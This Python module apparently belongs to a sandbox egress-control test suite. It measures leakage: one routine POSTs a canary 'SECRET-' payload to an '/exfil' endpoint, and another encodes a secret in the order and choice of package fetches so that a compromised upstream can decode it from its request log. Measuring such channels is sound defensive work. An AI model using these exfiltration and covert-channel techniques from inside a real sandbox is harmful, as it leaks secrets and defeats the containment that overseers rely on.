"""Residual covert-channel measurement (control S9).

Under SEP-1 the sandbox can still choose WHICH pinned entries to fetch, in WHAT
order, and WHEN. A compromised upstream observing the broker's upstream fetches
reads those choices. This module MEASURES that residual channel in bits/hour by
transmitting a known secret and decoding it at the receiver (the upstream's
request log), then dividing recovered bits by elapsed wall-clock.

We report an empirical, reproducible number — not an assertion. It is a *lower
bound* on what a patient adversary could do (we throttle for test speed) and an
*upper bound* relative to a caching broker (a broker that caches emits an
upstream fetch only on first access, collapsing the channel toward one-shot).
"""
from __future__ import annotations

import math
import time


def measure_capacity(t, ctx) -> dict:
    if t.config == "A":
        # Config A: a full-duplex byte channel. Transmit 1 KiB and confirm.
        payload = ("SECRET-" + ctx["canary"]) * 64
        t0 = time.time()
        r = t.egress("POST", ctx["allowed_host"], ctx["allowed_port"],
                     "/exfil", body=payload.encode())
        elapsed = max(time.time() - t0, 1e-6)
        arrived = ctx["harness"].recv_contains("SECRET-" + ctx["canary"])
        bits = len(payload) * 8 if arrived else 0
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "full-duplex byte channel (destination is compromised but on-list)",
                "channel_bits_per_hour": None if not arrived else "unbounded",
                "measured_bits_per_second": round(bits / elapsed, 1)}

    # Config B: selection channel through the broker, measured empirically.
    m = ctx.get("measure")
    if not m:
        return {"outcome": "PARTIAL", "achieved": True,
                "detail": "selection/ordering channel exists but no measurement rig supplied",
                "channel_bits_per_hour": None}

    alphabet = m["alphabet"]            # list of (eco,name,ver,art)
    k = len(alphabet)
    bits_per_symbol = math.log2(k)
    mt = m["transport"]

    # Known secret bitstring (fixed so the test is deterministic & checkable).
    secret_bits = _bits_from_bytes(b"SEP1-COVERT")  # 88 bits
    symbols = _bits_to_symbols(secret_bits, k)

    m["recv_reset"]()
    t0 = time.time()
    for sym in symbols:
        eco, name, ver, art = alphabet[sym]
        mt.fetch(eco, name, ver, art)
    elapsed = max(time.time() - t0, 1e-6)

    received_paths = m["recv_reader"]()
    recv_symbols = _paths_to_symbols(received_paths, alphabet)
    correct = sum(1 for a, b in zip(symbols, recv_symbols) if a == b)
    recovered_bits = correct * bits_per_symbol
    bits_per_hour = recovered_bits / elapsed * 3600.0

    # One-shot ordering capacity of a *caching* broker (structural note).
    oneshot_bits = math.log2(math.factorial(k)) if k > 1 else 0.0

    return {
        "outcome": "PARTIAL", "achieved": True,
        "detail": (f"selection channel: {correct}/{len(symbols)} symbols recovered; "
                   f"a caching broker collapses this toward ~{oneshot_bits:.0f} bits one-shot"),
        "channel_bits_per_hour": round(bits_per_hour, 1),
        "bits_per_symbol": round(bits_per_symbol, 3),
        "symbols_sent": len(symbols),
        "symbols_recovered": correct,
        "elapsed_s": round(elapsed, 4),
        "oneshot_ordering_bits_with_caching": round(oneshot_bits, 1),
    }


def _bits_from_bytes(b: bytes) -> list[int]:
    out = []
    for byte in b:
        for i in range(7, -1, -1):
            out.append((byte >> i) & 1)
    return out


def _bits_to_symbols(bits: list[int], k: int) -> list[int]:
    # Use floor(log2(k)) bits per symbol for a clean power-of-two mapping.
    b = int(math.log2(k))
    syms = []
    for i in range(0, len(bits) - b + 1, b):
        v = 0
        for j in range(b):
            v = (v << 1) | bits[i + j]
        syms.append(v)
    return syms


def _paths_to_symbols(paths: list[str], alphabet) -> list[int]:
    lut = {f"/pkg/{eco}/{name}/{ver}/{art}": i for i, (eco, name, ver, art) in enumerate(alphabet)}
    return [lut[p] for p in paths if p in lut]
